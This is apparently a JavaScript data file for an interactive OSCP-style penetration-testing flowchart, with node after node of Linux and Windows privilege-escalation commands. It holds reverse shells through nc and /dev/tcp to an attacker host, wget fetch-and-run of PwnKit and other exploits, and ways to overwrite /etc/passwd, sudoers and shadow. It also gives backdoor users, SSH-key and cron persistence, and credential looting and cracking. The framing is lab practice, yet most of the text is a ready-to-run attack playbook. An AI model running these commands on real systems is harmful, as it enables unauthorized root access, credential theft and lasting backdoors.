    warn: "If tcpdump or other exploit is blocked, check /var/log/syslog for AppArmor DENIED. AppArmor profiles restrict what processes can do even with sudo. Try a different command from sudo -l.",
    choices: [
      { label: "Got root shell via sudo", next: "got_root_linux" },
      { label: "sudo blocked by AppArmor — try another cmd", next: "linux_post_exploit" },
      { label: "Back to full enum", next: "linux_post_exploit" },
    ],
  },


  suid_check: {
    phase: "LINUX",
    title: "SUID / Capabilities Exploitation",
    body: "SUID binaries run as their owner (often root). eUID=0 even if uid shows your user. cp SUID is clean — overwrite /etc/sudoers directly. Always check GTFOBins with SUID filter.",
    cmd: `# ── FIND SUID BINARIES ───────────────────────────────
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
# Reference: https://gtfobins.github.io (enable SUID filter)

# ── CP (SUID) — CLEANEST METHOD ──────────────────────
# cp runs as root, can overwrite any file
# Method 1: overwrite /etc/sudoers (smoothest)
echo "joe ALL=(ALL) NOPASSWD: ALL" > /tmp/sudoers
cp /tmp/sudoers /etc/sudoers
sudo su
# or: sudo bash

# Method 2: add root user to /etc/passwd
cp /etc/passwd /tmp/passwd.bak
openssl passwd w00t        # → Fdzt.eqJQ4s0g
echo "jimi421:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd
su jimi421   # password: w00t

# Method 3: read /etc/shadow
cp /etc/shadow /tmp/shadow.txt
cat /tmp/shadow.txt
# Then crack with hashcat -m 1800

# ── PKEXEC (SUID) — PWNKIT CVE-2021-4034 ───────────
# pkexec is SUID by design but vulnerable versions = instant root
# Affects pkexec < 0.120 — all major distros
pkexec --version
# 0.105 = vulnerable (lab validated: Pelican PG Play)
# 0.105, 0.106, 0.107... up to 0.119 = all vulnerable

# Precompiled exploit (fastest):
wget http://$lhost/PwnKit -O /tmp/PwnKit
chmod +x /tmp/PwnKit && /tmp/PwnKit
# github.com/ly4k/PwnKit

# Source compile:
# git clone https://github.com/berdav/CVE-2021-4034
# make && ./cve-2021-4034

# ── FIND (SUID) ───────────────────────────────────────
find / -name . -exec /bin/bash -p \; -quit
find /tmp -exec /bin/bash -p \; -quit
# -p preserves effective UID = runs as root

# ── BASH (SUID) ───────────────────────────────────────
/bin/bash -p
# bash-5.0# euid=0(root)

# ── PYTHON / PYTHON3 (SUID) ──────────────────────────
python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
python -c 'import os; os.execl("/bin/sh","sh","-p")'

# ── VIM (SUID) ────────────────────────────────────────
vim -c ':py3 import os; os.execl("/bin/sh","sh","-p")'
vim -c ':!/bin/bash -p'
# Or from inside vim: :shell

# ── LESS / MORE (SUID) ───────────────────────────────
less /etc/passwd
# Inside less: !/bin/bash -p

# ── NMAP (SUID — older versions) ─────────────────────
nmap --interactive
# nmap> !sh

# ── PERL (SUID) ───────────────────────────────────────
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# ── AWK (SUID) ────────────────────────────────────────
awk 'BEGIN {system("/bin/bash -p")}'

# ── NANO (SUID) ───────────────────────────────────────
# Open any file, then:
# Ctrl+R Ctrl+X
# reset; bash -p 1>&0 2>&0

# ── XXDE / TCLSH / RUBY (SUID) ───────────────────────
# xxd — read shadow
xxd /etc/shadow | xxd -r
# tclsh
tclsh <<< 'exec /bin/bash -p'
# ruby
ruby -e 'exec "/bin/bash -p"'

# ── DD (SUID) — read/write any file ──────────────────
# Read shadow
dd if=/etc/shadow 2>/dev/null
# Overwrite passwd
echo "r00t::0:0:root:/root:/bin/bash" | dd of=/etc/passwd conv=append oflag=append

# ── TAR (SUID) ────────────────────────────────────────
tar -czf /tmp/shadow.tar.gz /etc/shadow
tar -xzf /tmp/shadow.tar.gz -C /tmp
cat /tmp/etc/shadow

# ── CAPABILITIES (getcap) ─────────────────────────────
getcap -r / 2>/dev/null
# cap_setuid+ep  = setuid to root
# cap_net_raw+ep = raw packet capture
# cap_dac_read_search = bypass read permission checks

# perl cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# python3 cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# node cap_setuid
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh",[],{stdio:"inherit"})'

# ── VERIFY ────────────────────────────────────────────
id
# uid=1000(joe) gid=1000(joe) euid=0(root) = root even though uid shows joe
whoami`,
    warn: "cp SUID → overwrite /etc/sudoers is the smoothest path — no shell needed, just sudo su after. Always use -p flag with bash/sh to preserve effective UID, otherwise it resets to your real UID.",
    choices: [
      { label: "Got root — grab proof", next: "got_root_linux" },
      { label: "Got shadow — crack hashes", next: "hashcrack" },
      { label: "Back to full enum", next: "linux_post_exploit" },
    ],
  },


  cron_check: {
    phase: "LINUX",
    title: "Cron Job Exploitation",
    body: "Module 18.3.1: find scripts run by root cron that you can write to. Append a reverse shell — within a minute you have root. Check /var/log/syslog for what's actually running.",
    cmd: `# ── FIND CRON JOBS ────────────────────────────────────
cat /etc/crontab
ls -la /etc/cron*
cat /etc/cron.d/*
crontab -l
sudo crontab -l   # root jobs if sudo allows

# ── CHECK SYSLOG FOR RUNNING CRON JOBS ───────────────
# Most reliable way to see what actually runs and when
grep "CRON" /var/log/syslog
grep "CRON" /var/log/syslog | tail -20
# Look for: (root) CMD (/path/to/script.sh)

# ── PSPY — WATCH WITHOUT ROOT ────────────────────────
# Download: github.com/DominicBreuker/pspy
wget http://$lhost/pspy64 -O /tmp/pspy64   # 64-bit
wget http://$lhost/pspy32 -O /tmp/pspy32   # 32-bit (match arch)
chmod +x /tmp/pspy64 && /tmp/pspy64

# Reading output — look for UID=0:
# CMD: UID=0 PID=121 | /bin/sh -c /var/archives/archive.sh
# CMD: UID=0 PID=122 | /bin/bash /var/archives/archive.sh
#   → root running archive.sh every minute
#   → ls -la /var/archives/archive.sh
#   → if world-writable: echo "chmod u+s /bin/bash" >> /var/archives/archive.sh
#   → wait 1 min → /bin/bash -p → root

# Filter to just root processes:
/tmp/pspy64 | grep "UID=0"

# Also watch for:
# Creds in args: sshpass -p, mysql -p, curl -u
# Scripts without full path = PATH hijack
# Temp files in /tmp = race condition

# ── CHECK SCRIPT PERMISSIONS ──────────────────────────
# Once you find a script run by root:
ls -la /home/joe/.scripts/user_backups.sh
# -rwxrwxrw- = world writable = exploitable
cat /home/joe/.scripts/user_backups.sh

# ── EXPLOIT — APPEND REVERSE SHELL ───────────────────
# Method 1: SUID bash (cleanest — no listener needed)
# Lab validated: OffSec capstone
echo "chmod u+s /bin/bash" >> /path/to/script.sh
# Wait up to 1 minute for cron to fire
ls -la /bin/bash   # watch for s bit: -rwsr-xr-x
/bin/bash -p       # -p preserves effective UID = root shell
# bash-5.1# whoami → root

# Method 2: reverse shell
echo "" >> /path/to/script.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost 443 >/tmp/f" >> /path/to/script.sh

# Method 3: copy bash with SUID
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /path/to/script.sh
# Wait then: /tmp/rootbash -p

# ── LISTENER ON KALI ─────────────────────────────────
nc -nlvp 443
# Wait up to 1 minute for cron to fire

# ── PATH INJECTION IN CRON ────────────────────────────
# If crontab has PATH= and calls script without full path:
# PATH=/home/joe:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# * * * * * cleanup.sh
# Create malicious cleanup.sh in /home/joe:
echo '#!/bin/bash
bash -i >& /dev/tcp/$lhost/443 0>&1' > /home/joe/cleanup.sh
chmod +x /home/joe/cleanup.sh`,
    warn: "Always use >> to APPEND to the cron script, never > which overwrites it. Overwriting may break the script and alert the admin. Check with cat after appending.",
    choices: [
      { label: "Got root shell from cron", next: "got_root_linux" },
      { label: "Script not writable — try PATH injection", next: "linux_privesc_extra" },
      { label: "Nothing writable — watch with pspy", next: "linpeas" },
      { label: "Back to full enum", next: "linux_post_exploit" },
    ],
  },


  passwd_shadow: {
    phase: "LINUX",
    title: "/etc/passwd & /etc/shadow Abuse",
    body: "Writable /etc/passwd = instant root. Readable /etc/shadow = crack offline. Two of the most common Linux privesc vectors on OSCP.",
    cmd: `# ── CHECK PERMISSIONS ────────────────────────────────
ls -la /etc/passwd /etc/shadow
# /etc/passwd  -rw-rw-rw-  = world writable = instant root
# /etc/shadow  readable    = grab hashes and crack

# ── WRITABLE /ETC/PASSWD — ADD ROOT USER ─────────────
# Step 1: generate hash
openssl passwd w00t
# → Fdzt.eqJQ4s0g

# Step 2: append root-level user
echo "jimi421:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

# Step 3: switch user
su jimi421    # password: w00t
id            # uid=0(root)

# Blank password variant (no password needed):
echo "r00t::0:0:root:/root:/bin/bash" >> /etc/passwd
su r00t       # just press Enter

# ── WRITABLE /ETC/PASSWD — REMOVE ROOT PASSWORD ──────
# Copy, edit, replace
cp /etc/passwd /tmp/passwd.bak
sed 's/root:x:/root::/' /etc/passwd > /tmp/passwd_new
cp /tmp/passwd_new /etc/passwd
su root       # blank password now works

# ── READABLE /ETC/SHADOW — CRACK OFFLINE ─────────────
cat /etc/shadow
# Copy both files to Kali:
scp user@$ip:/etc/shadow .
scp user@$ip:/etc/passwd .

# Unshadow then crack
unshadow passwd shadow > unshadowed.txt
hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# Hash format reference:
# $1$  = MD5          hashcat -m 500
# $5$  = SHA-256      hashcat -m 7400
# $6$  = SHA-512      hashcat -m 1800  (most common on modern Linux)
# $y$  = yescrypt     hashcat -m 7400

# ── WRITABLE /ETC/SHADOW — REPLACE ROOT HASH ─────────
# Generate hash
openssl passwd -6 -salt xyz newpassword   # SHA-512
python3 -c "import crypt; print(crypt.crypt('pass123', crypt.mksalt(crypt.METHOD_SHA512)))"
# Replace root hash in shadow (use sed or vim)
# Then: su root (password: newpassword)

# ── /ETC/SUDOERS WRITABLE ────────────────────────────
ls -la /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo su`,
    warn: "unix-privesc-check specifically flags world-writable /etc/passwd — run it if you haven't already. SHA-512 ($6$) hashes are slow to crack — use rules and targeted wordlists.",
    choices: [
      { label: "Got root via passwd", next: "got_root_linux" },
      { label: "Got shadow hashes — crack them", next: "hashcrack" },
      { label: "Back to enum", next: "linux_post_exploit" },
    ],
  },

  linux_manual_enum: {
    phase: "LINUX",
    title: "Linux Manual Enum — Capabilities, NFS, Writable Files",
    body: "Techniques automated tools often miss — capabilities, NFS no_root_squash, writable files owned by root, recently modified files.",
    cmd: `# ── CAPABILITIES ─────────────────────────────────────
getcap -r / 2>/dev/null
# cap_setuid+ep       = setuid to root
# cap_dac_read_search = bypass read permission
# cap_net_raw+ep      = raw packet capture

# Exploit cap_setuid — perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# Exploit cap_setuid — python3
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Exploit cap_setuid — node
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh",[],{stdio:"inherit"})'

# cap_dac_read_search — tar to read shadow
tar -czf /tmp/s.tar.gz /etc/shadow && tar -xzf /tmp/s.tar.gz -C /tmp && cat /tmp/etc/shadow

# ── NFS NO_ROOT_SQUASH ────────────────────────────────
cat /etc/exports
showmount -e $ip
# If no_root_squash present on a share:
# On Kali — mount and plant SUID binary:
sudo mount -t nfs $ip:/share /mnt/nfs
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash
# On target:
/share/rootbash -p
# Or mount on Kali and add root user to passwd

# ── WRITABLE FILES OWNED BY ROOT ─────────────────────
# Scripts run by root cron that you can write to
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v "/dev/" | grep -v run
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab /etc/hosts

# ── RECENTLY MODIFIED FILES ───────────────────────────
find / -mmin -10 -type f 2>/dev/null | grep -v proc | grep -v sys
find /etc -mtime -1 2>/dev/null
find / -newer /etc/passwd -type f 2>/dev/null | grep -v proc | grep -v sys

# ── LOG FILES — CREDENTIAL HUNTING ───────────────────
# adm group or root readable
cat /var/log/auth.log 2>/dev/null | grep -i "pass\|accept\|fail" | tail -30
cat /var/log/apache2/access.log 2>/dev/null | grep -i "pass"
cat /var/log/apache2/error.log 2>/dev/null | grep -i "pass"
grep -ri "password" /var/log/ 2>/dev/null | grep -v "^Binary" | head -20

# ── /VAR/MAIL — CREDENTIAL HUNTING ───────────────────
ls -la /var/mail/ /var/spool/mail/ 2>/dev/null
cat /var/mail/* 2>/dev/null

# ── NOOWNER FILES ─────────────────────────────────────
find / -nouser -o -nogroup 2>/dev/null | grep -v proc | grep -v sys

# ── UNMOUNTED DRIVES ──────────────────────────────────
lsblk
cat /etc/fstab
# Partitions with no MOUNTPOINT = unmounted = may contain creds`,
    warn: null,
    choices: [
      { label: "Capability found — GTFOBins", next: "suid_check" },
      { label: "NFS no_root_squash", next: "got_root_linux" },
      { label: "Writable cron script", next: "cron_check" },
      { label: "Found creds in logs/mail", next: "linux_password_hunt" },
      { label: "Back to main enum", next: "linux_post_exploit" },
    ],
  },



  kernel_exploit: {
    phase: "LINUX",
    title: "Kernel Exploit (Linux)",
    body: "Module 18.4.3: match kernel version + distro to a known CVE. Compile on target if gcc available — avoids cross-compilation issues. Kernel exploits can crash the system — test on a clone first.",
    cmd: `# ── GATHER TARGET INFO ───────────────────────────────
uname -r
uname -a
cat /etc/issue
cat /etc/os-release
arch

# ── SEARCHSPLOIT ON KALI ──────────────────────────────
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v "< 4.4.0" | grep -v "4.8"
searchsploit linux kernel $(uname -r | cut -d'-' -f1)
searchsploit linux privilege escalation | grep -i "local"

# ── WES-NG — MISSING PATCHES ──────────────────────────
# More reliable than searchsploit for kernel vulns
# On target:
uname -a > /tmp/sysinfo.txt
cat /etc/os-release >> /tmp/sysinfo.txt
# Transfer to Kali then:
python3 wes.py sysinfo.txt
python3 wes.py sysinfo.txt --impact "Privilege Escalation"

# ── COMMON KERNEL CVES ───────────────────────────────
# DirtyCow     CVE-2016-5195   kernel 2.6.22 to 4.8.3
# Overlayfs    CVE-2015-1328   Ubuntu 12.04/14.04/15.10
# Baron Samedit CVE-2021-3156  sudo < 1.9.5p2
# Dirty Pipe   CVE-2022-0847   kernel 5.8 to 5.16.11
# PwnKit       CVE-2021-4034   pkexec (all Linux distros)

# ── COMPILE ON TARGET (preferred — avoids cross-compile) ─
# Transfer source to target first
scp exploit.c user@$ip:/tmp/
# On target:
gcc exploit.c -o exploit
file exploit   # verify ELF 64-bit if target is x64
./exploit

# ── COMPILE ON KALI (may fail — glibc version mismatch) ──
# gcc -m32/-m64 gets arch right but libs may differ
# Error: /lib/x86_64-linux-gnu/libc.so.6: version GLIBC_2.34 not found
# = compiled against newer glibc than target has
# Solution: use Docker to match target environment exactly

# ── DOCKER — MATCH TARGET ENVIRONMENT (best method) ──
# Install once on Kali:
sudo apt-get install docker.io
sudo systemctl start docker && sudo systemctl enable docker
sudo usermod -aG docker $USER
newgrp docker   # apply group without logout

# Pull matching OS image
docker pull ubuntu:16.04   # match target distro + version

# Run container with current dir mounted, compile inside
sudo docker run --rm -it -v "$PWD":/work -w /work ubuntu:16.04 bash
# Inside container:
apt-get update && apt-get install -y gcc build-essential
gcc exploit.c -o exploit
exit
# Binary now compiled against Ubuntu 16 libs = matches target

# Transfer compiled binary to target
scp exploit user@$ip:/tmp/
# On target:
chmod +x /tmp/exploit && /tmp/exploit

# ── WORKFLOW: KERNEL VERSION → SEARCHSPLOIT → DOCKER COMPILE ─
# 1. cat /etc/issue && cat /etc/*release  (get distro)
# 2. uname -r                              (get kernel)
# 3. arch                                  (get architecture)
# 4. searchsploit linux kernel ubuntu 16 local privilege escalation | grep "4." | grep -v "< 4.4.0"
# 5. head -20 exploit.c                    (read compile instructions)
# 6. rename to match: mv 45010.c cve-2017-16995.c
# 7. docker compile matching distro
# 8. scp to target → run

# ── READ EXPLOIT COMPILE INSTRUCTIONS FIRST ──────────
# Module 18.4.3: always read the first 20 lines
head exploit.c -n 20
# Follow exact compile instructions in the comments

# ── LINUX-EXPLOIT-SUGGESTER ─────────────────────────
# Specifically for kernel CVE matching — different from LinPEAS
# On Kali: wget https://github.com/mzet-/linux-exploit-suggester/raw/master/linux-exploit-suggester.sh
wget http://$lhost/les.sh -O /tmp/les.sh
chmod +x /tmp/les.sh && /tmp/les.sh
# Outputs CVEs ranked by probability with compile instructions

# ── PWNKIT (CVE-2021-4034) — VERY RELIABLE ────────────
# Works on all major distros regardless of kernel version
# Affects pkexec < 0.120 — check version:
which pkexec
pkexec --version
ls -la /usr/bin/pkexec   # should have SUID bit
# 0.105 = vulnerable (lab validated: Pelican)
# LinPEAS flags this clearly — RED/YELLOW on pkexec

# Precompiled binary (easiest):
wget http://$lhost/PwnKit -O /tmp/PwnKit
chmod +x /tmp/PwnKit && /tmp/PwnKit
# github.com/ly4k/PwnKit — reliable precompiled version

# Source compile version:
# github.com/berdav/CVE-2021-4034
wget http://$lhost/pwnkit -O /tmp/pw
chmod +x /tmp/pw && /tmp/pw`,
    warn: "Kernel exploits can crash the system — always test on a clone first. Match BOTH kernel version AND distro. Mismatched exploit = kernel panic = system down = angry client.",
    choices: [
      { label: "Got root via kernel exploit", next: "got_root_linux" },
      { label: "No matching exploit — try sudo/SUID", next: "sudo_check" },
    ],
  },


  got_root_linux: {
    phase: "LINUX",
    title: "ROOT — Linux Post-Exploitation",
    body: "You're root. Screenshot first, then dump everything before the session dies. Same cyclical rule — new box = check for pivots.",
    cmd: `# ── STEP 1: PROOF SCREENSHOT ─────────────────────────
id && whoami && hostname
ip a
cat /root/proof.txt
cat /root/local.txt 2>/dev/null
# Screenshot must show: uid=0(root) + hostname + IP + flag — all in one frame

# ── STEP 2: DUMP /ETC/SHADOW ─────────────────────────
cat /etc/shadow
cat /etc/passwd

# Unshadow and crack on Kali
# cp both files to Kali then:
# unshadow passwd shadow > unshadowed.txt
# hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt
# john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# ── STEP 3: PLANT SSH KEY (persistence) ───────────────
# On Kali: ssh-keygen -t rsa -f /tmp/root_key
# Copy public key to target:
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...YOURPUBKEY..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
# Login: ssh -i /tmp/root_key root@$ip

# ── STEP 4: ADD BACKDOOR USER ─────────────────────────
useradd -m -s /bin/bash backdoor
echo "backdoor:pass123" | chpasswd
usermod -aG sudo backdoor
# Or directly in passwd:
echo "backdoor:$(openssl passwd w00t):0:0:root:/root:/bin/bash" >> /etc/passwd

# ── STEP 5: CHECK FOR PIVOTS ──────────────────────────
ip a
ip route
arp -a
cat /etc/hosts
# Two NICs = pivot opportunity -> go to pivot_start

# ── STEP 6: LOOT ──────────────────────────────────────
# SSH keys
find / -name "id_rsa" 2>/dev/null | xargs cat
find / -name "*.pem" -o -name "*.key" 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null

# Browser/app creds
find / -name "*.kdbx" 2>/dev/null
find / -name "*.db" -path "*/firefox/*" 2>/dev/null
find / -name "*.db" -path "*/chromium/*" 2>/dev/null

# History files
cat /root/.bash_history
cat /root/.mysql_history 2>/dev/null

# Config files
find /etc -name "*.conf" | xargs grep -il "password" 2>/dev/null
cat /etc/mysql/my.cnf 2>/dev/null
cat /var/www/html/config.php 2>/dev/null

# ── STEP 7: LINUX PERSISTENCE ─────────────────────────
# Cron backdoor
# echo "* * * * * root bash -i >& /dev/tcp/LHOST/4444 0>&1" >> /etc/crontab

# SUID bash copy
cp /bin/bash /tmp/.bash
chmod +s /tmp/.bash
/tmp/.bash -p   # regain root any time

# Sudoers backdoor
echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers`,
    warn: "Always screenshot BEFORE doing anything else — boxes get reverted. Plant the SSH key second so you can get back in if the shell dies.",
    choices: [
      { label: "Second NIC found — pivot", next: "pivot_start" },
      { label: "Got hashes — crack them", next: "hashcrack" },
      { label: "Next machine", next: "start" },
    ],
  },


  // ==========================================
  //  WINDOWS PRIVESC
  // ==========================================
  windows_post_exploit: {
    phase: "WINDOWS",
    title: "Windows — Initial Foothold Enumeration",
    body: "Orient before you attack. PEN-200 Module 17: gather situational awareness first. The privesc vector is almost always hidden in this output.",
    cmd: `# ── STEP 1: WHO AM I ─────────────────────────────────
whoami
whoami /all
whoami /priv
whoami /groups
hostname
whoami /groups | findstr "Mandatory Label"
# Medium = UAC active, High = already elevated, System = SYSTEM
# Disabled priv != not present — tools will activate it automatically

# ── STEP 2: AUTOMATED TOOLS FIRST ────────────────────
# Run these before manual enum — catches low hanging fruit fast
# LaZagne — credential dumper
.\\lazagne.exe all > lazagne.txt
type lazagne.txt

# PrivescCheck — maps to MITRE, produces HTML report
(new-object net.webclient).downloadstring("http://$lhost/PrivescCheck.ps1") | iex
Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML

# WinPEAS
iwr http://$lhost/winPEASx64.exe -OutFile winpeas.exe
.\\winpeas.exe > winpeas.txt

# Exfiltrate reports via SMB share
# On Kali: impacket-smbserver -smb2support kali . -username user -password pass
net use m: \\\\$lhost\\\\kali /user:user pass
copy PrivescCheck_* m:\\
copy winpeas.txt m:\\
copy lazagne.txt m:\\

# Open HTML report in browser:
# file:///home/kali/share/PrivescCheck_HOSTNAME.html

# ── STEP 3: USERS AND GROUPS ──────────────────────────
net user
Get-LocalUser
net localgroup
Get-LocalGroup
Get-LocalGroupMember Administrators
Get-LocalGroupMember "Remote Desktop Users"
Get-LocalGroupMember "Remote Management Users"
Get-LocalGroupMember "Backup Operators"

# Specific user details
net user <username>
# Shows groups, last logon, password policy

# Get SID
whoami /user
(New-Object System.Security.Principal.NTAccount("<username>")).Translate([System.Security.Principal.SecurityIdentifier]).Value

# Active sessions
query session
qwinsta

# ── STEP 4: OS AND ARCHITECTURE ───────────────────────
systeminfo
systeminfo | findstr /i "OS Name\|OS Version\|System Type"

# ── STEP 5: NETWORK ───────────────────────────────────
ipconfig /all
route print
netstat -ano
netstat -ano | findstr "127.0.0.1"
arp -a

# ── STEP 6: INSTALLED APPLICATIONS ───────────────────
# 32-bit apps
Get-ItemProperty "HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname,displayversion
# 64-bit apps
Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname,displayversion
Get-ChildItem "C:\\Program Files","C:\\Program Files (x86)" | select Name

# ── STEP 7: FILE HUNTING ──────────────────────────────
# Do this EARLY — notes/configs often contain creds (lab: WelcomeToWinter0121 in diana notes)
# User home dirs
Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.config,*.ps1,*.bat,*.log,*.bak -File -Recurse -ErrorAction SilentlyContinue
# Read all txt files in a directory at once
type C:\\Users\\diana\\Documents\\*.txt

# App-specific configs — based on what you found in Step 6
# Pattern: Get-ChildItem -Path C:\\<appdir> -Include *.txt,*.ini,*.conf,*.php,*.config -File -Recurse -ErrorAction SilentlyContinue
# XAMPP example:
Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini,*.conf,*.php,*.config -File -Recurse -ErrorAction SilentlyContinue
type C:\\xampp\\passwords.txt
type C:\\xampp\\mysql\\bin\\my.ini
# FileZilla example:
type C:\\Users\\$env:USERNAME\\AppData\\Roaming\\FileZilla\\sitemanager.xml
# IIS example:
Get-ChildItem -Path C:\\inetpub -Include web.config -Recurse -ErrorAction SilentlyContinue | Get-Content
# Jenkins example:
Get-ChildItem -Path C:\\ProgramData\\Jenkins -Include *.xml,*.conf -Recurse -ErrorAction SilentlyContinue
# KeePass — find the database
Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Broad search
Get-ChildItem -Path C:\\ -Include *pass*,*cred*,*secret*,*vnc*,*.kdbx,*config*,*unattend* -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# cmd style
dir /s /b C:\\Users\\*.txt
dir /s /b C:\\*pass*

# ── STEP 8: PS HISTORY AND TRANSCRIPTS ────────────────
# PSReadline — survives Clear-History
(Get-PSReadlineOption).HistorySavePath
type C:\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
Get-History
Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content

# Transcript files — plaintext PSCredential creation
Get-ChildItem -Path C:\\Users -Include *transcript* -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\\Users\\Public -Recurse -ErrorAction SilentlyContinue
type C:\\Users\\Public\\Transcripts\\transcript01.txt

# Event Viewer 4104 — GUI method (most reliable)
# Event Viewer -> Apps and Services -> Microsoft -> Windows -> PowerShell -> Operational
# Filter -> Event ID 4104 -> scroll Warning events -> Ctrl+F: password, net user, admin

# ── STEP 9: RUNNING PROCESSES ────────────────────────
Get-Process
Get-Process | Sort-Object ProcessName | Select Id,ProcessName,Path
# Non-standard processes (not in Windows or Program Files)
Get-Process | Select Id,ProcessName,Path | Where-Object Path -notlike "*Windows*" | Where-Object Path -notlike "*Program Files*"
# Who owns each process
Get-CimInstance Win32_Process | Select Name,ProcessId,@{N="Owner";E={$_.GetOwner().User}} | Sort Name

# ── STEP 10: SERVICES ─────────────────────────────────
# All running services
Get-CimInstance Win32_Service | Where State -eq "Running" | Select Name,State,PathName
# Spot non-standard paths (not in Windows dir)
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"

# Drill into specific service — who runs it
Get-CimInstance Win32_Service -Filter "Name='EnterpriseService'" | Select Name,State,StartName,ProcessId,PathName
# StartName = which account runs it

# Check permissions on service directory
icacls "C:\Services"
# NT AUTHORITY\Authenticated Users:(M) = you can write = hijack possible
# Write test
echo "" > "C:\Services\test.txt"

# Service config
sc.exe qc <ServiceName>
sc.exe queryex <ServiceName>

# Unquoted paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"

# ── STEP 11: SCHEDULED TASKS ──────────────────────────
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run\|next run"
Get-ScheduledTask | Where TaskPath -notlike "\\Microsoft*" | Select TaskName,TaskPath

# ── STEP 12: PRIVESC QUICK CHECKS ────────────────────
# Spooler running? (needed for PrintSpoofer)
sc.exe queryex spooler
# State STOPPED = PrintSpoofer/PrintNightmare wont work

# AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# Winlogon autologon
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword

# WDigest — plaintext creds in LSASS
reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential

# Clipboard
Get-Clipboard

# Credential manager
cmdkey /list

# AV check
Get-MpComputerStatus | select AMRunningMode,RealTimeProtectionEnabled

# ── STEP 13: CREDENTIAL FILES ─────────────────────────
Get-ChildItem -Path C:\\ -Include unattend.xml,sysprep.xml,sysprep.inf -Recurse -ErrorAction SilentlyContinue
type C:\\Windows\\Panther\\Unattend.xml
type C:\\Users\\$env:USERNAME\\AppData\\Roaming\\FileZilla\\sitemanager.xml
Get-ChildItem -Path C:\\inetpub -Include web.config -Recurse -ErrorAction SilentlyContinue | Get-Content
Get-ChildItem Env: | Select Name,Value

# ── STEP 14: SAM DUMP (if SeBackupPrivilege or SYSTEM) ─
reg save HKLM\\sam sam
reg save HKLM\\SYSTEM system
reg save HKLM\\SECURITY security
# Transfer via SMB then:
# impacket-secretsdump -sam sam -system system local
# impacket-psexec Administrator@$ip -hashes :NTLMHASH

# ── STEP 15: GRAB FLAGS ───────────────────────────────
type C:\\Users\\$env:USERNAME\\Desktop\\local.txt
Get-ChildItem -Path C:\\Users -Include local.txt,proof.txt -Recurse -ErrorAction SilentlyContinue | Get-Content

# ── NOTE: ENUMERATION IS CYCLICAL ────────────────────
# Every new user = start over from Step 1
# Lab pattern: diana(file notes)->alex(horizontal)->enterprise(DLL)->SeBackupPriv->SAM dump
# New user = new files readable, new services accessible, new history
# Always re-run whoami /priv and check group memberships after pivoting`,
    warn: "PSReadline history survives Clear-History — always check it. Transcript files often contain PSCredential creation commands with plaintext passwords. Re-enumerate fully after gaining each new user account — permissions change and you unlock new files.",
    choices: [
      { label: "SeImpersonatePrivilege in whoami /priv", next: "token_privs" },
      { label: "In Admins but medium integrity — UAC bypass", next: "win_uac_bypass" },
      { label: "Run WinPEAS automated enum", next: "winpeas" },
      { label: "Credential hunting (files/PS history/XAMPP)", next: "windows_creds" },
